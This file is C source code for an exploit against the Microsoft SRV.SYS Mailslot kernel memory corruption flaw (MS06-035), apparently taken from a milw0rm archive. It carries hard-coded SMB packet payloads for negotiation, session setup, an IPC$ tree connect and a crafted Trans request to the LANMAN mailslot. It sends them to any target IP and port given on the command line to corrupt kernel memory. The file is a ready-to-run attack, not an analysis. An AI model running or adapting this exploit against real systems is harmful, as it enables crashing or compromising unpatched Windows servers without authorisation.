#include <stdio.h>
#include <windows.h>
#include <winsock.h>

/*******************************************************************
Microsoft SRV.SYS Mailslot Ring0 Memory Corruption(MS06-035) Exploit

by cocoruder(frankruder_at_hotmail.com),2006.7.19
page:http://ruder.cdut.net
*******************************************************************/


unsigned char SmbNeg[] =
"\x00\x00\x00\x2f\xff\x53\x4d\x42\x72\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x88\x05\x00\x00\x00\x00\x00\x0c\x00\x02\x4e\x54"
"\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00";

unsigned char Session_Setup_AndX_Request[]=
"\x00\x00\x00\x48\xff\x53\x4d\x42\x73\x00"
"\x00\x00\x00\x08\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\xff\xff\x88\x05\x00\x00\x00\x00\x0d\xff\x00\x00\x00\xff"
"\xff\x02\x00\x88\x05\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x01\x00\x00\x00\x0b\x00\x00\x00\x6e\x74\x00\x70\x79\x73\x6d"
"\x62\x00";

unsigned char TreeConnect_AndX_Request[]=
"\x00\x00\x00\x58\xff\x53\x4d\x42\x75\x00"
"\x00\x00\x00\x18\x07\xc8\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\xff\xfe\x00\x08\x00\x03\x04\xff\x00\x58\x00\x08"
"\x00\x01\x00\x2d\x00\x00\x5c\x00\x5c\x00\x31\x00\x37\x00\x32\x00"
"\x2e\x00\x32\x00\x32\x00\x2e\x00\x35\x00\x2e\x00\x34\x00\x36\x00"
"\x5c\x00\x49\x00\x50\x00\x43\x00\x24\x00\x00\x00\x3f\x3f\x3f\x3f"
"\x3f\x00";

unsigned char Trans_Request[]=
"\x00\x00\x00\x56\xff\x53\x4d\x42\x25\x00"
"\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x08\x88\x05\x00\x08\x00\x00\x11\x00\x00\x01\x00\x00"
"\x04\xe0\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x55"
"\x00\x01\x00\x55\x00\x03\x00\x01\x00\x00\x00\x00\x00\x11\x00\x5c"
"\x4d\x41\x49\x4c\x53\x4c\x4f\x54\x5c\x4c\x41\x4e\x4d\x41\x4e\x41";


unsigned char recvbuff[2048];





void neg ( int s )
{
char response[1024];

memset(response,0,sizeof(response));

send(s,(char *)SmbNeg,sizeof(SmbNeg)-1,0);
}

void main(int argc,char **argv)
{
struct sockaddr_in server;
SOCKET sock;
DWORD ret;
WSADATA ws;

WORD userid,treeid;


WSAStartup(MAKEWORD(2,2),&ws);

sock = socket(AF_INET,SOCK_STREAM,0);
if(sock<=0)
{
return;
}

server.sin_family = AF_INET;
server.sin_addr.s_addr = inet_addr(argv[1]);
server.sin_port = htons((USHORT)atoi(argv[2]));

ret=connect(sock,(struct sockaddr *)&server,sizeof(server));
if (ret==-1)
{
printf("connect error!\n");
return;
}

neg(sock);

recv(sock,(char *)recvbuff,sizeof(recvbuff),0);

ret=send(sock,(char *)Session_Setup_AndX_Request,sizeof(Session_Setup_AndX_Request)-1,0);
if (ret<=0)
{
printf("send Session_Setup_AndX_Request error!\n");
return;
}
recv(sock,(char *)recvbuff,sizeof(recvbuff),0);

userid=*(WORD *)(recvbuff+0x20); //get userid


memcpy(TreeConnect_AndX_Request+0x20,(char *)&userid,2); //update userid


ret=send(sock,(char *)TreeConnect_AndX_Request,sizeof(TreeConnect_AndX_Request)-1,0);
if (ret<=0)
{
printf("send TreeConnect_AndX_Request error!\n");
return;
}
recv(sock,(char *)recvbuff,sizeof(recvbuff),0);

treeid=*(WORD *)(recvbuff+0x1c); //get treeid

memcpy(Trans_Request+0x20,(char *)&userid,2); //update userid
memcpy(Trans_Request+0x1c,(char *)&treeid,2); //update treeid

ret=send(sock,(char *)Trans_Request,sizeof(Trans_Request)-1,0);
if (ret<=0)
{
printf("send Trans_Request error!\n");
return;
}
recv(sock,(char *)recvbuff,sizeof(recvbuff),0);

}

// milw0rm.com [2006-07-21]